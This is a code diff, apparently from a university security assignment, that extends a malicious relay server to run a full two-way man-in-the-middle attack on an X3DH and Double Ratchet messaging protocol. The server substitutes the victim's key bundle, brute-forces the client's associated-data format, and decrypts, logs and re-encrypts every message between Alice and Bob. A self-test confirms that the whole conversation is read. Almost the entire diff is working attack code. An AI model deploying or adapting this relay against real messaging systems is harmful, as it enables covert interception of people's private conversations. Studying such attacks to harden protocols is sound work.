@@ -57,6 +57,7 @@ static int         g_port      = 9000;
 static std::string g_victim    = "bob";     // whose bundle we substitute / session we MITM
 static std::string g_initiator = "alice";   // who starts the session we read
 static bool        g_verbose   = false;
+static bool        g_full_mitm = true;       // Phase 3 (both directions); --phase2 forces single-shot
 
 #define DIE(msg) do { std::fprintf(stderr, "[attack2] FATAL: %s\n", msg); std::exit(1); } while (0)
 
@@ -254,12 +255,6 @@ static bool decode32(const std::string& b64, uint8_t out[32]) {
     return true;
 }
 
-// header JSON as serialized for the AEAD associated data: {dh,pn,n} only, no init.
-static std::string serialize_header(const std::string& dh_b64, long pn, long n) {
-    return "{\"dh\":\"" + dh_b64 + "\",\"pn\":" + std::to_string(pn) +
-           ",\"n\":" + std::to_string(n) + "}";
-}
-
 // --- Associated-data format discovery -------------------------------------
 // The protocol doc leaves serialize(header) and the raw layout of st.AD
 // under-specified, so we discover the Go client's exact convention empirically
@@ -396,7 +391,7 @@ static bool ratchet_decrypt(Ratchet& st, const uint8_t dh_pub[32], long pn, long
     kdf_ck(st.CKr, mk, st.CKr);
     st.Nr++;
     uint8_t nonce[12] = {0};
-    std::string ad = st.AD + serialize_header(dh_b64, pn, n);
+    std::string ad = st.AD + build_header_ad(g_hmode, dh_b64, pn, n, "");
     return aead_decrypt(mk, nonce, ct, ctlen,
                         (const uint8_t*)ad.data(), ad.size(), pt_out);
 }
@@ -411,7 +406,7 @@ static void ratchet_encrypt(Ratchet& st, const std::string& pt,
     pn_out = st.PN; n_out = st.Ns;
     st.Ns++;
     uint8_t nonce[12] = {0};
-    std::string ad = st.AD + serialize_header(dh_b64_out, pn_out, n_out);
+    std::string ad = st.AD + build_header_ad(g_hmode, dh_b64_out, pn_out, n_out, "");
     if (!aead_encrypt(mk, nonce, (const uint8_t*)pt.data(), pt.size(),
                       (const uint8_t*)ad.data(), ad.size(), ct_out))
         DIE("ratchet_encrypt");
@@ -455,6 +450,70 @@ static std::map<std::string, std::vector<std::string>> g_mailbox; // user -> que
 static bool    g_victim_bundle_seen = false;
 static uint8_t g_victim_ik_dh[32], g_victim_spk[32], g_victim_ik_sig[32]; // real victim publics
 static bool    g_mitm_done = false;                               // Phase 2: first message only
+
+// ---------------------------------------------------------------------------
+// Shared X3DH + discovery helpers (used by both the Phase 2 single-shot path
+// and the Phase 3 bidirectional relay).
+// ---------------------------------------------------------------------------
+
+// Mallory as RESPONDER (impersonating the victim to the initiator): derive the
+// shared secret from the initiator's ik_dh + ek using Mallory's substituted
+// private keys. DH4 (one-time prekey) is included iff opk_id != 0.
+static void x3dh_respond(const uint8_t ik_dh_A[32], const uint8_t ek_A[32],
+                         long opk_id, uint8_t sk[32]) {
+    uint8_t dh1[32], dh2[32], dh3[32], dh4[32];
+    x25519_dh(M_spk.priv, ik_dh_A, dh1);   // DH1 = DH(SPK_M, IK_A)
+    x25519_dh(M_ik.priv,  ek_A,    dh2);   // DH2 = DH(IK_M, EK_A)
+    x25519_dh(M_spk.priv, ek_A,    dh3);   // DH3 = DH(SPK_M, EK_A)
+    std::vector<uint8_t> ikm(32, 0xFF);
+    ikm.insert(ikm.end(), dh1, dh1 + 32);
+    ikm.insert(ikm.end(), dh2, dh2 + 32);
+    ikm.insert(ikm.end(), dh3, dh3 + 32);
+    if (opk_id != 0) { x25519_dh(M_opk.priv, ek_A, dh4); ikm.insert(ikm.end(), dh4, dh4 + 32); }
+    uint8_t zeros[32] = {0};
+    hkdf_sha256(zeros, 32, ikm.data(), ikm.size(), "AS3_X3DH", 8, sk, 32);
+}
+
+// Mallory as INITIATOR toward the real victim (Bob): fresh ephemeral key, derive
+// the shared secret against the victim's REAL published bundle (no OPK).
+static void x3dh_initiate_to_victim(uint8_t ek_pub[32], uint8_t ek_priv[32], uint8_t sk[32]) {
+    x25519_keygen(ek_pub, ek_priv);
+    uint8_t v1[32], v2[32], v3[32];
+    x25519_dh(M_ik.priv, g_victim_spk,   v1);   // DH1 = DH(IK_M, SPK_B)
+    x25519_dh(ek_priv,   g_victim_ik_dh, v2);   // DH2 = DH(EK_M, IK_B)
+    x25519_dh(ek_priv,   g_victim_spk,   v3);   // DH3 = DH(EK_M, SPK_B)
+    std::vector<uint8_t> ikm(32, 0xFF);
+    ikm.insert(ikm.end(), v1, v1 + 32);
+    ikm.insert(ikm.end(), v2, v2 + 32);
+    ikm.insert(ikm.end(), v3, v3 + 32);
+    uint8_t zeros[32] = {0};
+    hkdf_sha256(zeros, 32, ikm.data(), ikm.size(), "AS3_X3DH", 8, sk, 32);
+}
+
+// Brute-force the Go client's AEAD associated-data convention against the first
+// message key. On success sets g_pmode/g_hmode/g_fmt_known and returns the
+// recovered plaintext. (This is the discovery mechanism documented in the
+// README / Report §5.C — kept so it can be shown in the viva.)
+static bool discover_ad(const uint8_t mk[32], const std::vector<uint8_t>& ctv,
+                        const uint8_t ik_dh_A[32], const uint8_t ik_sig_A[32],
+                        const std::string& dh_b64, long pn, long n,
+                        const std::string& wire_header, std::string& plaintext) {
+    uint8_t nonce[12] = {0};
+    for (int pm = 0; pm < P_COUNT; ++pm) {
+        std::string prefix = build_prefix_ad(pm, ik_dh_A, ik_sig_A, M_ik.pub, M_ik_sig);
+        for (int hm = 0; hm < H_COUNT; ++hm) {
+            std::string ad = prefix + build_header_ad(hm, dh_b64, pn, n, wire_header);
+            if (aead_decrypt(mk, nonce, ctv.data(), ctv.size(),
+                             (const uint8_t*)ad.data(), ad.size(), plaintext)) {
+                g_pmode = pm; g_hmode = hm; g_fmt_known = true;
+                std::printf("[attack2] AD format discovered: prefix=%s  header=%s\n",
+                            PMODE_NAME[pm], HMODE_NAME[hm]);
+                return true;
+            }
+        }
+    }
+    return false;
+}
 
 // ---------------------------------------------------------------------------
 // MITM core: on Alice's first frame, decrypt it and re-encrypt toward Bob.
@@ -575,6 +634,121 @@ static std::string mitm_first_frame(const std::string& frame) {
 }
 
 // ---------------------------------------------------------------------------
+// Phase 3: full bidirectional MITM. Mallory holds two PERSISTENT ratchet
+// sessions and relays every frame of the conversation, reading both directions:
+//
+//   g_AM : Mallory as RESPONDER to Alice  (recv chain = from Alice, send = to Alice)
+//   g_MB : Mallory as INITIATOR to Bob    (send chain  = to Bob,    recv  = from Bob)
+//
+//   Alice -> Bob : decrypt on g_AM, re-encrypt on g_MB, deliver to Bob
+//   Bob   -> Alice: decrypt on g_MB, re-encrypt on g_AM, deliver to Alice
+//
+// Each ratchet_decrypt/ratchet_encrypt advances its own chain and performs the
+// DH-ratchet step when the peer's `dh` changes, so the conversation keeps
+// flowing (and stays readable) across both parties' ratchet turns.
+// ---------------------------------------------------------------------------
+static Ratchet     g_AM;                       // Mallory <-> Alice (Mallory responder)
+static Ratchet     g_MB;                       // Mallory <-> Bob   (Mallory initiator)
+static bool        g_AM_up = false, g_MB_up = false;
+static std::string g_init_block_MB;            // init block to attach to Mallory's FIRST frame to Bob
+static long        g_n_AtoB = 0, g_n_BtoA = 0; // recovered-message counters (for logging)
+
+// Alice -> Bob : recover plaintext on g_AM, re-encrypt on g_MB, forward to Bob.
+static std::string relay_A_to_B(const std::string& frame) {
+    std::string header = j_obj(frame, "header");
+    std::string dh_b64 = j_str(header, "dh");
+    long pn = j_int(header, "pn", 0), n = j_int(header, "n", 0);
+    uint8_t dh_A[32];
+    if (!decode32(dh_b64, dh_A)) { std::fprintf(stderr, "[attack2] A->B dh parse fail\n"); return ""; }
+    auto ctv = b64_decode(j_str(frame, "ct"));
+
+    if (!g_AM_up) {
+        std::string init = j_obj(header, "init");
+        if (init.empty()) { std::fprintf(stderr, "[attack2] first A->B frame lacks init\n"); return ""; }
+        uint8_t ik_dh_A[32], ik_sig_A[32], ek_A[32];
+        if (!decode32(j_str(init, "ik_dh"), ik_dh_A) || !decode32(j_str(init, "ek"), ek_A)) {
+            std::fprintf(stderr, "[attack2] init parse fail\n"); return "";
+        }
+        decode32(j_str(init, "ik_sig"), ik_sig_A);
+        long opk_id = j_int(init, "opk_id", 0);
+
+        uint8_t sk_AM[32];
+        x3dh_respond(ik_dh_A, ek_A, opk_id, sk_AM);
+
+        if (!g_fmt_known) {                       // discover the AD convention once
+            uint8_t mk0[32]; std::string pt0;
+            first_recv_mk(sk_AM, M_spk.pub, M_spk.priv, dh_A, mk0);
+            if (!discover_ad(mk0, ctv, ik_dh_A, ik_sig_A, dh_b64, pn, n, header, pt0)) {
+                std::fprintf(stderr, "[attack2] DECRYPT FAILED — no AD variant matched\n");
+                return "";
+            }
+        }
+        init_receiver(g_AM, sk_AM, M_spk.pub, M_spk.priv,
+                      build_prefix_ad(g_pmode, ik_dh_A, ik_sig_A, M_ik.pub, M_ik_sig));
+        g_AM_up = true;
+    }
+
+    std::string pt;
+    if (!ratchet_decrypt(g_AM, dh_A, pn, n, dh_b64, ctv.data(), ctv.size(), pt)) {
+        std::fprintf(stderr, "[attack2] A->B ratchet_decrypt failed (n=%ld)\n", n);
+        return "";
+    }
+    std::printf("[attack2]  %s -> %s  #%ld : \"%s\"\n",
+                g_initiator.c_str(), g_victim.c_str(), ++g_n_AtoB, pt.c_str());
+    std::fflush(stdout);
+
+    if (!g_MB_up) {                               // open Mallory's session to the real Bob
+        if (!g_victim_bundle_seen) { std::fprintf(stderr, "[attack2] victim bundle unknown\n"); return ""; }
+        uint8_t ek_pub[32], ek_priv[32], sk_MB[32];
+        x3dh_initiate_to_victim(ek_pub, ek_priv, sk_MB);
+        init_sender(g_MB, sk_MB, g_victim_spk,
+                    build_prefix_ad(g_pmode, M_ik.pub, M_ik_sig, g_victim_ik_dh, g_victim_ik_sig));
+        g_init_block_MB =
+            "\"init\":{\"ik_sig\":\"" + b64_encode(M_ik_sig, 32) + "\","
+            "\"ik_dh\":\""  + b64_encode(M_ik.pub, 32) + "\","
+            "\"ek\":\""     + b64_encode(ek_pub, 32) + "\","
+            "\"opk_id\":0}";
+        g_MB_up = true;
+    }
+
+    std::string odh; long opn, on; std::vector<uint8_t> oct;
+    ratchet_encrypt(g_MB, pt, odh, opn, on, oct);
+    std::string hdr = "{\"dh\":\"" + odh + "\",\"pn\":" + std::to_string(opn) +
+                      ",\"n\":" + std::to_string(on);
+    if (!g_init_block_MB.empty()) { hdr += "," + g_init_block_MB; g_init_block_MB.clear(); }
+    hdr += "}";
+    return "{\"from\":\"" + g_initiator + "\",\"to\":\"" + g_victim + "\",\"header\":" + hdr +
+           ",\"ct\":\"" + b64_encode(oct.data(), oct.size()) + "\"}";
+}
+
+// Bob -> Alice : recover plaintext on g_MB, re-encrypt on g_AM, forward to Alice.
+static std::string relay_B_to_A(const std::string& frame) {
+    if (!g_MB_up || !g_AM_up) { std::fprintf(stderr, "[attack2] B->A before session is up\n"); return ""; }
+    std::string header = j_obj(frame, "header");
+    std::string dh_b64 = j_str(header, "dh");
+    long pn = j_int(header, "pn", 0), n = j_int(header, "n", 0);
+    uint8_t dh_B[32];
+    if (!decode32(dh_b64, dh_B)) { std::fprintf(stderr, "[attack2] B->A dh parse fail\n"); return ""; }
+    auto ctv = b64_decode(j_str(frame, "ct"));
+
+    std::string pt;
+    if (!ratchet_decrypt(g_MB, dh_B, pn, n, dh_b64, ctv.data(), ctv.size(), pt)) {
+        std::fprintf(stderr, "[attack2] B->A ratchet_decrypt failed (n=%ld)\n", n);
+        return "";
+    }
+    std::printf("[attack2]  %s -> %s  #%ld : \"%s\"\n",
+                g_victim.c_str(), g_initiator.c_str(), ++g_n_BtoA, pt.c_str());
+    std::fflush(stdout);
+
+    std::string odh; long opn, on; std::vector<uint8_t> oct;
+    ratchet_encrypt(g_AM, pt, odh, opn, on, oct);
+    std::string hdr = "{\"dh\":\"" + odh + "\",\"pn\":" + std::to_string(opn) +
+                      ",\"n\":" + std::to_string(on) + "}";
+    return "{\"from\":\"" + g_victim + "\",\"to\":\"" + g_initiator + "\",\"header\":" + hdr +
+           ",\"ct\":\"" + b64_encode(oct.data(), oct.size()) + "\"}";
+}
+
+// ---------------------------------------------------------------------------
 // Self-test: simulate a genuine Alice (initiator) and Bob (responder) using the
 // same primitives, and verify (a) Mallory recovers Alice's plaintext and
 // (b) the re-encrypted frame decrypts cleanly on the real Bob. This validates
@@ -671,6 +845,135 @@ static int run_selftest() {
     return 1;
 }
 
+// Phase 3 bidirectional self-test: drive a genuine Alice and Bob through the
+// SAME relay_A_to_B / relay_B_to_A paths the live server uses, over several
+// messages in both directions (including each party's DH-ratchet turn), and
+// verify every plaintext is recovered by Mallory AND decrypts on the far peer.
+static int run_selftest_full() {
+    std::printf("[selftest-full] bidirectional Alice <-> (Mallory) <-> Bob ...\n");
+    uint8_t zeros[32] = {0};
+
+    // Reset Phase 3 session state.
+    g_AM_up = g_MB_up = false; g_init_block_MB.clear();
+    g_n_AtoB = g_n_BtoA = 0; g_fmt_known = false;
+
+    // Real Bob (victim) bundle, "published" to the server.
+    KeyPair B_ik, B_spk;
+    x25519_keygen(B_ik.pub, B_ik.priv);
+    x25519_keygen(B_spk.pub, B_spk.priv);
+    memcpy(g_victim_ik_dh, B_ik.pub, 32);
+    memcpy(g_victim_spk,   B_spk.pub, 32);
+    memset(g_victim_ik_sig, 0, 32);
+    g_victim_bundle_seen = true;
+
+    // Genuine Alice performs X3DH against Mallory's substituted bundle (M_*).
+    KeyPair A_ik, A_ek;
+    x25519_keygen(A_ik.pub, A_ik.priv);
+    x25519_keygen(A_ek.pub, A_ek.priv);
+    uint8_t d1[32], d2[32], d3[32], d4[32];
+    x25519_dh(A_ik.priv, M_spk.pub, d1);
+    x25519_dh(A_ek.priv, M_ik.pub,  d2);
+    x25519_dh(A_ek.priv, M_spk.pub, d3);
+    x25519_dh(A_ek.priv, M_opk.pub, d4);            // opk_id = 1
+    std::vector<uint8_t> ikmA(32, 0xFF);
+    ikmA.insert(ikmA.end(), d1, d1 + 32);
+    ikmA.insert(ikmA.end(), d2, d2 + 32);
+    ikmA.insert(ikmA.end(), d3, d3 + 32);
+    ikmA.insert(ikmA.end(), d4, d4 + 32);
+    uint8_t skA[32];
+    hkdf_sha256(zeros, 32, ikmA.data(), ikmA.size(), "AS3_X3DH", 8, skA, 32);
+    std::string adA; adA.append((char*)A_ik.pub, 32); adA.append((char*)M_ik.pub, 32);
+
+    Ratchet stA; init_sender(stA, skA, M_spk.pub, adA);
+    std::string a_init =
+        "{\"ik_sig\":\"" + b64_encode(A_ik.pub, 32) + "\",\"ik_dh\":\"" + b64_encode(A_ik.pub, 32) +
+        "\",\"ek\":\"" + b64_encode(A_ek.pub, 32) + "\",\"opk_id\":1}";
+
+    Ratchet stB; bool stB_up = false;             // genuine Bob, set up on his first receive
+    int fails = 0;
+
+    auto alice_send = [&](const std::string& msg, bool first) {
+        std::string dh; long pn, n; std::vector<uint8_t> ct;
+        ratchet_encrypt(stA, msg, dh, pn, n, ct);
+        std::string h = "{\"dh\":\"" + dh + "\",\"pn\":" + std::to_string(pn) +
+                        ",\"n\":" + std::to_string(n) + (first ? ",\"init\":" + a_init : "") + "}";
+        return "{\"from\":\"" + g_initiator + "\",\"to\":\"" + g_victim + "\",\"header\":" + h +
+               ",\"ct\":\"" + b64_encode(ct.data(), ct.size()) + "\"}";
+    };
+    auto bob_recv = [&](const std::string& fwd, const std::string& expect) {
+        std::string h = j_obj(fwd, "header");
+        uint8_t dh[32]; decode32(j_str(h, "dh"), dh);
+        long pn = j_int(h, "pn", 0), n = j_int(h, "n", 0);
+        auto ct = b64_decode(j_str(fwd, "ct"));
+        if (!stB_up) {                             // first frame from Mallory carries init
+            std::string bi = j_obj(h, "init");
+            uint8_t mik[32], mek[32];
+            decode32(j_str(bi, "ik_dh"), mik); decode32(j_str(bi, "ek"), mek);
+            uint8_t b1[32], b2[32], b3[32];
+            x25519_dh(B_spk.priv, mik, b1);
+            x25519_dh(B_ik.priv,  mek, b2);
+            x25519_dh(B_spk.priv, mek, b3);
+            std::vector<uint8_t> ik(32, 0xFF);
+            ik.insert(ik.end(), b1, b1 + 32); ik.insert(ik.end(), b2, b2 + 32); ik.insert(ik.end(), b3, b3 + 32);
+            uint8_t skB[32]; hkdf_sha256(zeros, 32, ik.data(), ik.size(), "AS3_X3DH", 8, skB, 32);
+            std::string adB; adB.append((char*)mik, 32); adB.append((char*)B_ik.pub, 32);
+            init_receiver(stB, skB, B_spk.pub, B_spk.priv, adB);
+            stB_up = true;
+        }
+        std::string got;
+        bool ok = ratchet_decrypt(stB, dh, pn, n, j_str(h, "dh"), ct.data(), ct.size(), got);
+        if (!ok || got != expect) { std::printf("[selftest-full] FAIL Bob recv: ok=%d \"%s\"\n", ok, got.c_str()); fails++; }
+    };
+    auto bob_send = [&](const std::string& msg) {
+        std::string dh; long pn, n; std::vector<uint8_t> ct;
+        ratchet_encrypt(stB, msg, dh, pn, n, ct);
+        std::string h = "{\"dh\":\"" + dh + "\",\"pn\":" + std::to_string(pn) + ",\"n\":" + std::to_string(n) + "}";
+        return "{\"from\":\"" + g_victim + "\",\"to\":\"" + g_initiator + "\",\"header\":" + h +
+               ",\"ct\":\"" + b64_encode(ct.data(), ct.size()) + "\"}";
+    };
+    auto alice_recv = [&](const std::string& fwd, const std::string& expect) {
+        std::string h = j_obj(fwd, "header");
+        uint8_t dh[32]; decode32(j_str(h, "dh"), dh);
+        long pn = j_int(h, "pn", 0), n = j_int(h, "n", 0);
+        auto ct = b64_decode(j_str(fwd, "ct"));
+        std::string got;
+        bool ok = ratchet_decrypt(stA, dh, pn, n, j_str(h, "dh"), ct.data(), ct.size(), got);
+        if (!ok || got != expect) { std::printf("[selftest-full] FAIL Alice recv: ok=%d \"%s\"\n", ok, got.c_str()); fails++; }
+    };
+
+    // A->B, A->B, B->A, B->A, A->B, B->A : exercises both chains + DH-ratchet turns.
+    struct Step { bool a2b; const char* msg; };
+    const Step steps[] = {
+        {true,  "msg1: hi bob"},
+        {true,  "msg2: still alice"},
+        {false, "msg3: hey alice (bob)"},
+        {false, "msg4: bob again"},
+        {true,  "msg5: alice after ratchet"},
+        {false, "msg6: bob final"},
+    };
+    bool first_a2b = true;
+    for (const Step& s : steps) {
+        if (s.a2b) {
+            std::string fwd = relay_A_to_B(alice_send(s.msg, first_a2b));
+            first_a2b = false;
+            if (fwd.empty()) { std::printf("[selftest-full] FAIL: relay_A_to_B dropped\n"); return 1; }
+            bob_recv(fwd, s.msg);
+        } else {
+            std::string fwd = relay_B_to_A(bob_send(s.msg));
+            if (fwd.empty()) { std::printf("[selftest-full] FAIL: relay_B_to_A dropped\n"); return 1; }
+            alice_recv(fwd, s.msg);
+        }
+    }
+
+    if (fails == 0) {
+        std::printf("[selftest-full] PASS — %ld A->B and %ld B->A messages recovered by "
+                    "Mallory and delivered intact.\n", g_n_AtoB, g_n_BtoA);
+        return 0;
+    }
+    std::printf("[selftest-full] FAIL — %d mismatch(es).\n", fails);
+    return 1;
+}
+
 // ---------------------------------------------------------------------------
 // Per-connection handling
 // ---------------------------------------------------------------------------
@@ -727,15 +1030,19 @@ static void handle_request(int fd, const std::string& line, std::string& who) {
     } else if (type == "send") {
         std::string frame = j_obj(line, "frame");
         std::string from = j_str(frame, "from"), to = j_str(frame, "to");
-        std::string forwarded;
-        bool mitmed = false;
+        bool handled = false;
         {
             std::lock_guard<std::mutex> lk(g_mu);
-            if (!g_mitm_done && from == g_initiator && to == g_victim) {
-                forwarded = mitm_first_frame(frame);
-                if (!forwarded.empty()) { g_mailbox[g_victim].push_back(forwarded); g_mitm_done = true; mitmed = true; }
+            if (g_full_mitm) {
+                std::string out;
+                if (from == g_initiator && to == g_victim)      out = relay_A_to_B(frame);
+                else if (from == g_victim && to == g_initiator) out = relay_B_to_A(frame);
+                if (!out.empty()) { g_mailbox[to].push_back(out); handled = true; }
+            } else if (!g_mitm_done && from == g_initiator && to == g_victim) {
+                std::string out = mitm_first_frame(frame);   // Phase 2 single-shot
+                if (!out.empty()) { g_mailbox[g_victim].push_back(out); g_mitm_done = true; handled = true; }
             }
-            if (!mitmed) g_mailbox[to].push_back(frame);   // pass-through
+            if (!handled) g_mailbox[to].push_back(frame);    // pass-through
         }
         send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
 
@@ -777,7 +1084,9 @@ int main(int argc, char** argv) {
         else if (!std::strcmp(argv[i], "--victim") && i + 1 < argc) g_victim = argv[++i];
         else if (!std::strcmp(argv[i], "--initiator") && i + 1 < argc) g_initiator = argv[++i];
         else if (!std::strcmp(argv[i], "-v")) g_verbose = true;
+        else if (!std::strcmp(argv[i], "--phase2")) g_full_mitm = false;   // single-shot (Phase 2 demo)
         else if (!std::strcmp(argv[i], "--selftest")) { gen_mallory_keys(); return run_selftest(); }
+        else if (!std::strcmp(argv[i], "--selftest-full")) { gen_mallory_keys(); return run_selftest_full(); }
     }
     gen_mallory_keys();
 
@@ -789,10 +1098,15 @@ int main(int argc, char** argv) {
     if (bind(srv, (sockaddr*)&a, sizeof(a)) < 0) DIE("bind");
     if (listen(srv, 16) < 0) DIE("listen");
 
-    std::printf("[attack2] MALICIOUS SERVER on :%d  victim=%s initiator=%s\n",
-                g_port, g_victim.c_str(), g_initiator.c_str());
-    std::printf("[attack2] substituting %s's bundle; will decrypt %s's first message "
-                "and forward transparently.\n\n", g_victim.c_str(), g_initiator.c_str());
+    std::printf("[attack2] MALICIOUS SERVER on :%d  victim=%s initiator=%s  mode=%s\n",
+                g_port, g_victim.c_str(), g_initiator.c_str(),
+                g_full_mitm ? "PHASE3 full bidirectional MITM" : "PHASE2 single-shot");
+    if (g_full_mitm)
+        std::printf("[attack2] substituting %s's bundle; relaying BOTH directions, reading "
+                    "the whole conversation.\n\n", g_victim.c_str());
+    else
+        std::printf("[attack2] substituting %s's bundle; decrypting %s's FIRST message "
+                    "and forwarding transparently.\n\n", g_victim.c_str(), g_initiator.c_str());
     std::fflush(stdout);
 
     for (;;) {
